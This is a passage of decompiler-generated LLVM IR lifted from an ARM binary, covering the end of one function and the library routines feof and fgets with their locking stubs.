  %v0_14340 = load i32, i32* %r7.global-to-local, align 4
  %v1_14340 = add i32 %v0_14340, 4
  store i32 %v1_14340, i32* %r0.global-to-local, align 4
  %v0_14344 = load i32, i32* @lr, align 4
  %v2_14344 = add i32 %v0_14344, 26512
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_1434c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1434c, i32* %r2.global-to-local, align 4
  %v4_14350 = mul i32 %v2_14338, 4
  %v5_14350 = add i32 %v2_14344, %v4_14350
  %v6_14350 = inttoptr i32 %v5_14350 to i32*
  %v7_14350 = load i32, i32* %v6_14350, align 4
  store i32 %v7_14350, i32* @ip, align 4
  store i32 82780, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14350)
  %v0_1435c = load i32, i32* %r0.global-to-local, align 4
  %v1_14360 = load i32, i32* %r7.global-to-local, align 4
  %v2_14360 = add i32 %v1_14360, 28
  %v3_14360 = inttoptr i32 %v2_14360 to i32*
  store i32 %v0_1435c, i32* %v3_14360, align 4
  %v7_14364 = icmp sgt i32 %v0_1435c, 5
  br i1 %v7_14364, label %dec_label_pc_14478, label %dec_label_pc_1437c

dec_label_pc_1436c:                               ; preds = %dec_label_pc_14328
  %v1_1436c = add i32 %v1_14338, 1
  store i32 %v1_1436c, i32* %r1.global-to-local, align 4
  %v3_14370 = icmp ult i32 %v1_1436c, %v1_14324
  br i1 %v3_14370, label %dec_label_pc_14328, label %dec_label_pc_14478

dec_label_pc_1437c:                               ; preds = %.thread28, %dec_label_pc_14338, %dec_label_pc_142b8
  %v0_1437c = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_1437c, 1
  br i1 %tmp156, label %dec_label_pc_14428, label %dec_label_pc_14384

dec_label_pc_14384:                               ; preds = %dec_label_pc_1437c
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_1439c = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %dec_label_pc_14410, %dec_label_pc_14384
  %v9_143a8 = phi i32 [ 0, %dec_label_pc_14384 ], [ %v1_14414, %dec_label_pc_14410 ]
  %v7_1438c = icmp sgt i32 %v9_143a8, 2
  br i1 %v7_1438c, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_14388
  store i32 %v9_1439c, i32* %r3.global-to-local, align 4
  %v10_143a8 = add i32 %v9_143a8, %v9_1439c
  store i32 %v10_143a8, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_14388
  store i32 %v3_14004.pre-phi, i32* @ip, align 4
  %v12_14390 = mul i32 %v9_143a8, 4
  %v13_14390 = add i32 %v12_14390, %v3_14004.pre-phi
  store i32 %v13_14390, i32* %r3.global-to-local, align 4
  %v9_14398 = add i32 %v13_14390, -12
  %v10_14398 = inttoptr i32 %v9_14398 to i8*
  %v11_14398 = load i8, i8* %v10_14398, align 4
  %v12_14398 = zext i8 %v11_14398 to i32
  store i32 %v12_14398, i32* %r2.global-to-local, align 4
  %v9_143a0 = load i32, i32* %r7.global-to-local, align 4
  %v10_143a0 = add i32 %v9_143a0, %v9_143a8
  store i32 %v10_143a0, i32* %r3.global-to-local, align 4
  store i32 %v12_14398, i32* %r1.global-to-local, align 4
  %v11_143ac = add i32 %v10_143a0, 36
  %v12_143ac = inttoptr i32 %v11_143ac to i8*
  store i8 %v11_14398, i8* %v12_143ac, align 1
  %v0_143b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_143d0 = phi i32 [ %v10_143a8, %.thread38 ], [ %v0_143b0.pre, %bb157 ]
  %v1_143b0 = load i32, i32* %fp.global-to-local, align 4
  %v2_143b0 = sub i32 %v0_143d0, %v1_143b0
  %v4_143b0 = xor i32 %v1_143b0, %v0_143d0
  %v5_143b0 = xor i32 %v2_143b0, %v0_143d0
  %v6_143b0 = and i32 %v5_143b0, %v4_143b0
  %v7_143b0 = icmp slt i32 %v6_143b0, 0
  %v8_143b0 = icmp slt i32 %v2_143b0, 0
  %v9_143b0 = icmp eq i32 %v0_143d0, %v1_143b0
  %v3_143b4 = xor i1 %v8_143b0, %v7_143b0
  %v4_143b4 = or i1 %v9_143b0, %v3_143b4
  br i1 %v4_143b4, label %dec_label_pc_143c4, label %dec_label_pc_143b8

dec_label_pc_143b8:                               ; preds = %bb158
  %v1_143b8 = add i32 %v0_143d0, -9
  %v3_143b8 = sub i32 8, %v0_143d0
  %v4_143b8 = and i32 %v3_143b8, %v0_143d0
  %v5_143b8 = icmp slt i32 %v4_143b8, 0
  %v6_143b8 = icmp slt i32 %v1_143b8, 0
  %v7_143b8 = icmp eq i32 %v0_143d0, 9
  %v3_143bc = xor i1 %v6_143b8, %v5_143b8
  %v4_143bc = or i1 %v7_143b8, %v3_143bc
  br i1 %v4_143bc, label %dec_label_pc_143c0, label %dec_label_pc_14478

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143b8
  store i32 %v0_143d0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_143c4

dec_label_pc_143c4:                               ; preds = %bb158, %dec_label_pc_143c0
  store i32 %v3_14004.pre-phi, i32* @r2, align 4
  %v1_143c8 = load i32, i32* %r8.global-to-local, align 4
  %v4_143c8 = mul i32 %v1_143c8, 4
  %v5_143c8 = add i32 %v4_143c8, %v3_14004.pre-phi
  store i32 %v5_143c8, i32* %sb.global-to-local, align 4
  %v1_143cc = add i32 %v5_143c8, -40
  %v2_143cc = inttoptr i32 %v1_143cc to i32*
  %v3_143cc = load i32, i32* %v2_143cc, align 4
  store i32 %v3_143cc, i32* %r5.global-to-local, align 4
  %v1_143d0 = add i32 %v0_143d0, -1
  store i32 %v1_143d0, i32* %r3.global-to-local, align 4
  %v0_143d4 = load i32, i32* %r7.global-to-local, align 4
  %v4_143d4 = mul i32 %v1_143d0, 4
  %v5_143d4 = add i32 %v0_143d4, %v4_143d4
  store i32 %v5_143d4, i32* %sl.global-to-local, align 4
  %v7_143d8 = icmp eq i32 %v3_143cc, 8
  %v1_143dc = add i32 %v5_143d4, 40
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  store i32 %v3_143dc, i32* @r0, align 4
  br i1 %v7_143d8, label %dec_label_pc_14410, label %dec_label_pc_143e4

dec_label_pc_143e4:                               ; preds = %dec_label_pc_143c4
  %v9_143e4 = icmp eq i32 %v3_143dc, %v3_143cc
  br i1 %v9_143e4, label %dec_label_pc_14408, label %bb159

bb159:                                            ; preds = %dec_label_pc_143e4
  %v8_143e8 = icmp eq i32 %v3_143dc, 8
  br i1 %v8_143e8, label %dec_label_pc_14408, label %dec_label_pc_143f0

dec_label_pc_143f0:                               ; preds = %bb159
  %v0_143f0 = call i32 @_promoted_size()
  %v0_143f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_143f8, i32* @r0, align 4
  %v0_143fc = call i32 @_promoted_size()
  store i32 %v0_143fc, i32* %r0.global-to-local, align 4
  %v8_14404 = icmp sgt i32 %v0_143f0, %v0_143fc
  br i1 %v8_14404, label %dec_label_pc_14410, label %dec_label_pc_143f0.dec_label_pc_14408_crit_edge

dec_label_pc_143f0.dec_label_pc_14408_crit_edge:  ; preds = %dec_label_pc_143f0
  %v0_14408.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_1440c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14408

dec_label_pc_14408:                               ; preds = %dec_label_pc_143f0.dec_label_pc_14408_crit_edge, %dec_label_pc_143e4, %bb159
  %v1_1440c = phi i32 [ %v1_1440c.pre, %dec_label_pc_143f0.dec_label_pc_14408_crit_edge ], [ %v5_143d4, %dec_label_pc_143e4 ], [ %v5_143d4, %bb159 ]
  %v0_14408 = phi i32 [ %v0_14408.pre, %dec_label_pc_143f0.dec_label_pc_14408_crit_edge ], [ %v5_143c8, %dec_label_pc_143e4 ], [ %v5_143c8, %bb159 ]
  %v1_14408 = add i32 %v0_14408, -40
  %v2_14408 = inttoptr i32 %v1_14408 to i32*
  %v3_14408 = load i32, i32* %v2_14408, align 4
  store i32 %v3_14408, i32* %r3.global-to-local, align 4
  %v2_1440c = add i32 %v1_1440c, 40
  %v3_1440c = inttoptr i32 %v2_1440c to i32*
  store i32 %v3_14408, i32* %v3_1440c, align 4
  br label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %dec_label_pc_143f0, %dec_label_pc_143c4, %dec_label_pc_14408
  %v0_14410 = load i32, i32* %r7.global-to-local, align 4
  %v1_14410 = add i32 %v0_14410, 28
  %v2_14410 = inttoptr i32 %v1_14410 to i32*
  %v3_14410 = load i32, i32* %v2_14410, align 4
  %v0_14414 = load i32, i32* %r8.global-to-local, align 4
  %v1_14414 = add i32 %v0_14414, 1
  store i32 %v1_14414, i32* %r8.global-to-local, align 4
  %v1_14418 = add i32 %v3_14410, 2
  store i32 %v1_14418, i32* %r3.global-to-local, align 4
  %v6_14420 = icmp slt i32 %v1_14414, %v1_14418
  br i1 %v6_14420, label %dec_label_pc_14388, label %dec_label_pc_14444

dec_label_pc_14428:                               ; preds = %dec_label_pc_1437c
  %v0_14428 = load i32, i32* %r7.global-to-local, align 4
  %v1_14428 = add i32 %v0_14428, 28
  %v2_14428 = inttoptr i32 %v1_14428 to i32*
  %v3_14428 = load i32, i32* %v2_14428, align 4
  store i32 %v3_14428, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_14430 = add i32 %v0_14428, 38
  %v4_14430 = inttoptr i32 %v3_14430 to i8*
  store i8 1, i8* %v4_14430, align 1
  %v0_14434 = load i32, i32* %r2.global-to-local, align 4
  %v3_14434 = mul i32 %v0_14434, 4
  store i32 %v3_14434, i32* @r2, align 4
  %v0_14438 = load i32, i32* %r7.global-to-local, align 4
  %v1_14438 = add i32 %v0_14438, 40
  store i32 %v1_14438, i32* @r0, align 4
  %v2_1443c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1443c, i32* @r1, align 4
  %v0_14440 = call i32 @memcpy()
  store i32 %v0_14440, i32* %r0.global-to-local, align 4
  %v0_14444.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %dec_label_pc_14410, %dec_label_pc_14428
  %v2_14460 = phi i32 [ %v0_14444.pre, %dec_label_pc_14428 ], [ %v0_14410, %dec_label_pc_14410 ]
  %v1_14444 = add i32 %v2_14460, 16
  %v2_14444 = inttoptr i32 %v1_14444 to i32*
  %v3_14444 = load i32, i32* %v2_14444, align 4
  store i32 %v3_14444, i32* %r3.global-to-local, align 4
  %v1_14448 = and i32 %v3_14444, 128
  %v2_14448 = icmp eq i32 %v1_14448, 0
  br i1 %v2_14448, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_14444
  %v3_1444c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_1444c, i32* %r3.global-to-local, align 4
  %v2_14450 = inttoptr i32 %v2_14460 to i32*
  %v3_14450 = load i32, i32* %v2_14450, align 4
  %v2_14458.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_14458 = sub i32 %v2_14458.pre, %v3_1444c
  store i32 %v3_14458, i32* %r3.global-to-local, align 4
  %v5_1445c = mul i32 %v3_14458, 4
  %v6_1445c = add i32 %v5_1445c, %v3_14450
  store i32 %v6_1445c, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_14444
  %v1_1445445 = load i32, i32* %r6.global-to-local, align 4
  %v2_1445446 = add i32 %v1_1445445, 1
  store i32 %v2_1445446, i32* %r3.global-to-local, align 4
  %v3_14460 = inttoptr i32 %v2_14460 to i32*
  store i32 %v2_1445446, i32* %v3_14460, align 4
  %v0_14464.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_1446c = phi i32 [ %v2_14460, %.thread48 ], [ %v0_14464.pre, %.thread50 ]
  %v1_14464 = add i32 %v1_1446c, 28
  %v2_14464 = inttoptr i32 %v1_14464 to i32*
  %v3_14464 = load i32, i32* %v2_14464, align 4
  store i32 %v3_14464, i32* %r3.global-to-local, align 4
  %v1_14468 = add i32 %v3_14464, 2
  store i32 %v1_14468, i32* %r0.global-to-local, align 4
  %v0_1446c = load i32, i32* %fp.global-to-local, align 4
  %v2_1446c = add i32 %v1_1446c, 24
  %v3_1446c = inttoptr i32 %v2_1446c to i32*
  store i32 %v0_1446c, i32* %v3_1446c, align 4
  br i1 %v2_14448, label %dec_label_pc_1447c, label %bb161

bb161:                                            ; preds = %bb160
  %v1_14470 = load i32, i32* @r2, align 4
  %v2_14470 = load i32, i32* %r7.global-to-local, align 4
  %v3_14470 = inttoptr i32 %v2_14470 to i32*
  store i32 %v1_14470, i32* %v3_14470, align 4
  br label %dec_label_pc_1447c

dec_label_pc_14478:                               ; preds = %dec_label_pc_1436c, %dec_label_pc_13f8c, %dec_label_pc_140d4, %dec_label_pc_14180, %dec_label_pc_14158, %dec_label_pc_14164, %dec_label_pc_140a0, %dec_label_pc_143b8, %dec_label_pc_14338, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1447c

dec_label_pc_1447c:                               ; preds = %bb161, %bb160, %dec_label_pc_14478
  %v2_14480 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14480, i32* @r4, align 4
  store i32 %v6_13f48, i32* @r5, align 4
  store i32 %v27_13f48, i32* @lr, align 4
  %v1_14484 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14484

; uselistorder directives
  uselistorder i32 %v3_14458, { 1, 0 }
  uselistorder i32 %v1_14414, { 1, 2, 0 }
  uselistorder i32 %v2_143b0, { 1, 0 }
  uselistorder i32 %v1_143b0, { 1, 0, 2 }
  uselistorder i32 %v0_143d0, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_143a8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1436c, { 1, 2, 0 }
  uselistorder i32 %v0_1435c, { 1, 0 }
  uselistorder i32 %v1_14338, { 1, 0, 2 }
  uselistorder i32 %v1_142ac, { 1, 2, 0 }
  uselistorder i32 %v1_14294, { 1, 0 }
  uselistorder i32 %v2_1427c, { 2, 1, 0 }
  uselistorder i32 %v1_14260, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14258, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_1423c, { 1, 0, 2 }
  uselistorder i32 %v2_14224, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14218, { 2, 1, 0 }
  uselistorder i32 %v1_141d8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_141c8.pre, { 0, 2, 1 }
  uselistorder i32 %v2_141a4, { 1, 0 }
  uselistorder i32 %v5_14104, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14104, { 1, 0 }
  uselistorder i32 %v0_1410876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_140ac, { 1, 0 }
  uselistorder i32 %v0_140cc, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_14090, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_14078, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_14068, { 1, 0 }
  uselistorder i32 %v3_14060, { 0, 2, 1 }
  uselistorder i8 %v2_14060, { 0, 1, 3, 2 }
  uselistorder i32 %v0_140e0, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_14024, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14010, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13ff8, { 1, 0 }
  uselistorder i32 %v3_14004.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_13fac, { 0, 2, 1 }
  uselistorder i32 %v2_13f98, { 1, 0, 2 }
  uselistorder i32 %v0_13f4c, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 11, 9, 12, 10, 3, 4, 14, 5, 13, 6, 7, 8, 16, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1, 3 }
  uselistorder i32 1012, { 1, 2, 0, 3 }
  uselistorder i32 -36940, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 -40, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1447c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14478, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_14444, { 1, 0 }
  uselistorder label %dec_label_pc_14410, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14408, { 0, 2, 1 }
  uselistorder label %dec_label_pc_143c4, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_1437c, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14190, { 1, 0 }
  uselistorder label %dec_label_pc_14144, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_140c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140bc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1405c, { 1, 0 }
  uselistorder label %dec_label_pc_14058, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1405c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13ffc, { 1, 0 }
  uselistorder label %dec_label_pc_13fd0, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_144b8 = load i32, i32* @r4, align 4
  store i32 %v3_144b8, i32* %stack_var_-20, align 4
  %v2_144bc = add i32 %tmp, 52
  %v3_144bc = inttoptr i32 %v2_144bc to i32*
  %v4_144bc = load i32, i32* %v3_144bc, align 4
  store i32 ptrtoint (i32* @global_var_14f9c.882 to i32), i32* %r5.global-to-local, align 4
  %v1_144c4 = sub i32 1, %v4_144bc
  %v2_144c4 = icmp ult i32 %v4_144bc, 2
  br i1 %v2_144c4, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_144c4, %entry ]
  %v0_144cc = phi i32 [ 0, %bb ], [ %v1_144c4, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_144cc = icmp eq i32 %v0_144cc, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_144cc, label %dec_label_pc_14518, label %dec_label_pc_144e0

dec_label_pc_144e0:                               ; preds = %thread-pre-split
  %v2_144e4 = add i32 %tmp, 56
  store i32 %v2_144e4, i32* %r4.global-to-local, align 4
  %v4_144f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_144f8)
  %v0_1450c = load i32, i32* %r5.global-to-local, align 4
  %v2_1450c = add i32 %v0_1450c, 16
  %v3_1450c = inttoptr i32 %v2_1450c to i32*
  %v4_1450c = load i32, i32* %v3_1450c, align 4
  store i32 %v4_1450c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1450c)
  %v0_14518.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1451c.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_14518.pre, 0
  br label %dec_label_pc_14518

dec_label_pc_14518:                               ; preds = %thread-pre-split, %dec_label_pc_144e0
  %v0_1451c = phi i32 [ %tmp, %thread-pre-split ], [ %v0_1451c.pre, %dec_label_pc_144e0 ]
  %v0_14518 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_144e0 ]
  %v1_1451c = inttoptr i32 %v0_1451c to i16*
  %v2_1451c = load i16, i16* %v1_1451c, align 2
  %v3_1451c = zext i16 %v2_1451c to i32
  store i32 %v3_1451c, i32* %r4.global-to-local, align 4
  br i1 %v0_14518, label %dec_label_pc_14518..thread4_crit_edge, label %bb15

dec_label_pc_14518..thread4_crit_edge:            ; preds = %dec_label_pc_14518
  %v0_14534.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_14518
  %v1_1452c = load i32, i32* %r5.global-to-local, align 4
  %v3_1452c = add i32 %v1_1452c, 24
  %v4_1452c = inttoptr i32 %v3_1452c to i32*
  %v5_1452c = load i32, i32* %v4_1452c, align 4
  store i32 %v5_1452c, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14518..thread4_crit_edge, %bb15
  %v0_14534 = phi i32 [ %v0_14534.pre, %dec_label_pc_14518..thread4_crit_edge ], [ %v5_1452c, %bb15 ]
  %v2_14534 = xor i1 %v0_14518, true
  call void @__pseudo_cond_branch(i1 %v2_14534, i32 %v0_14534)
  %v0_14538 = load i32, i32* %r4.global-to-local, align 4
  %v1_14538 = and i32 %v0_14538, 4
  %v2_14540 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14540, i32* @r4, align 4
  ret i32 %v1_14538

; uselistorder directives
  uselistorder i1 %v0_14518, { 1, 0 }
  uselistorder i32 %v1_144c4, { 1, 0 }
  uselistorder i32 %v4_144bc, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_14518, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1454c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1454c:
  %v0_1454c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1454c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1454c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1454c, %bb
  %v10_14558 = phi i32 [ %arg1, %dec_label_pc_1454c ], [ 0, %bb ]
  ret i32 %v10_14558

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1455c = load i32, i32* @r4, align 4
  store i32 %v3_1455c, i32* %stack_var_-28, align 4
  %v6_1455c = load i32, i32* @r5, align 4
  %v9_1455c = load i32, i32* @r6, align 4
  %v12_1455c = load i32, i32* @r7, align 4
  %v21_1455c = load i32, i32* @lr, align 4
  %v1_14560 = add i32 %arg3, 52
  %v2_14560 = inttoptr i32 %v1_14560 to i32*
  %v3_14560 = load i32, i32* %v2_14560, align 4
  %v1_14568 = sub i32 1, %v3_14560
  %v2_14568 = icmp ult i32 %v3_14560, 2
  br i1 %v2_14568, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14568, %entry ]
  %v0_14570 = phi i32 [ 0, %bb ], [ %v1_14568, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_14570 = icmp eq i32 %v0_14570, 0
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_14570, label %dec_label_pc_145c4, label %dec_label_pc_1458c

dec_label_pc_1458c:                               ; preds = %bb16
  %v1_14590 = add i32 %arg3, 56
  store i32 %v1_14590, i32* @r4, align 4
  %v4_145a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_145a4)
  %v0_145b8 = load i32, i32* @r5, align 4
  %v2_145b8 = add i32 %v0_145b8, 16
  %v3_145b8 = inttoptr i32 %v2_145b8 to i32*
  %v4_145b8 = load i32, i32* %v3_145b8, align 4
  store i32 %v4_145b8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_145c4.891 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_145b8)
  %v0_145c4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_145c8.pre = load i32, i32* @r7, align 4
  %v0_145cc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_145c4

dec_label_pc_145c4:                               ; preds = %bb16, %dec_label_pc_1458c
  %v0_145cc = phi i32 [ %arg3, %bb16 ], [ %v0_145cc.pre, %dec_label_pc_1458c ]
  %v0_145c8 = phi i32 [ %arg2, %bb16 ], [ %v0_145c8.pre, %dec_label_pc_1458c ]
  %v0_145c4 = phi i32 [ %arg1, %bb16 ], [ %v0_145c4.pre, %dec_label_pc_1458c ]
  %v3_145d0 = inttoptr i32 %v0_145c4 to i8*
  %v4_145d0 = call i32 @__GI_fgets_unlocked(i8* %v3_145d0, i32 %v0_145c8, i32 %v0_145cc)
  %v0_145d4 = load i32, i32* %sl.global-to-local, align 4
  %v2_145d4 = icmp eq i32 %v0_145d4, 0
  store i32 %v4_145d0, i32* %r4.global-to-local, align 4
  br i1 %v2_145d4, label %dec_label_pc_145c4..thread3_crit_edge, label %bb17

dec_label_pc_145c4..thread3_crit_edge:            ; preds = %dec_label_pc_145c4
  %v0_145f0.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_145c4
  %v1_145e8 = load i32, i32* @r5, align 4
  %v3_145e8 = add i32 %v1_145e8, 24
  %v4_145e8 = inttoptr i32 %v3_145e8 to i32*
  %v5_145e8 = load i32, i32* %v4_145e8, align 4
  store i32 %v5_145e8, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_145c4..thread3_crit_edge, %bb17
  %v0_145f0 = phi i32 [ %v0_145f0.pre, %dec_label_pc_145c4..thread3_crit_edge ], [ %v5_145e8, %bb17 ]
  %v2_145f0 = xor i1 %v2_145d4, true
  call void @__pseudo_cond_branch(i1 %v2_145f0, i32 %v0_145f0)
  %v0_145f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_145fc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_145fc, i32* @r4, align 4
  store i32 %v6_1455c, i32* @r5, align 4
  store i32 %v9_1455c, i32* @r6, align 4
  store i32 %v12_1455c, i32* @r7, align 4
  store i32 %v21_1455c, i32* @lr, align 4
  ret i32 %v0_145f4

; uselistorder directives
  uselistorder i32 %v3_14560, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_145c4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14608(i32 %arg1) local_unnamed_addr {
dec_label_pc_14608:
  %v0_14608 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14608, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14608
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14608, %bb
  %v10_14614 = phi i32 [ %arg1, %dec_label_pc_14608 ], [ 0, %bb ]
  ret i32 %v10_14614

; uselistorder directives
